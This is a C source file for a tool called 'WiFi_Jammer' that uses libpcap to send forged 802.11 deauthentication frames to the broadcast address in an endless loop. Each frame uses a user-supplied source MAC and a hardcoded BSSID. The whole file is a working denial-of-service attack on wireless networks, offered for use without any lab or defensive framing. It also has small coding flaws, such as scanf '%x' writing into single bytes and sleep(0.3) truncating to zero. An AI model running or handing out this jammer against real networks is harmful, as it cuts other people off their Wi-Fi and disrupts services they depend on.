#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <stdbool.h>
#include <unistd.h>

void usage() {
	printf("syntax: WiFi_Jammer <interface>\n");
	printf("sample: WiFi_Jammer mon0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;
	
	u_char SMac[6];

	printf("SRC Mac: ");
	scanf("%x:%x:%x:%x:%x:%x", &SMac[0], &SMac[1], &SMac[2], &SMac[3], &SMac[4], &SMac[5]);

	unsigned char packet[1024] = {
		0x00, 0x00, 0x0c, 0x00, 0x04, 0x80, 0x00, 0x00, 0x02, 0x00, 0x18, 0x00, 0xc0, 0x00, 0x3a, 0x01,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5], 0xec, 0x08, 0x6b, 0x37,
		0x4e, 0xa9, 0x30, 0x00, 0x07, 0x00
	};


	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	while(true){
		printf("[*] Sent - { %02X:%02X:%02X:%02X:%02X:%02X }\n",SMac[0], SMac[1], SMac[2], SMac[3], SMac[4], SMac[5]);  
		if(pcap_sendpacket(pcap, packet, 38) != 0){
			printf("[-] Failed!\n");
		}
		sleep(0.3);
	}

    pcap_close(pcap);
}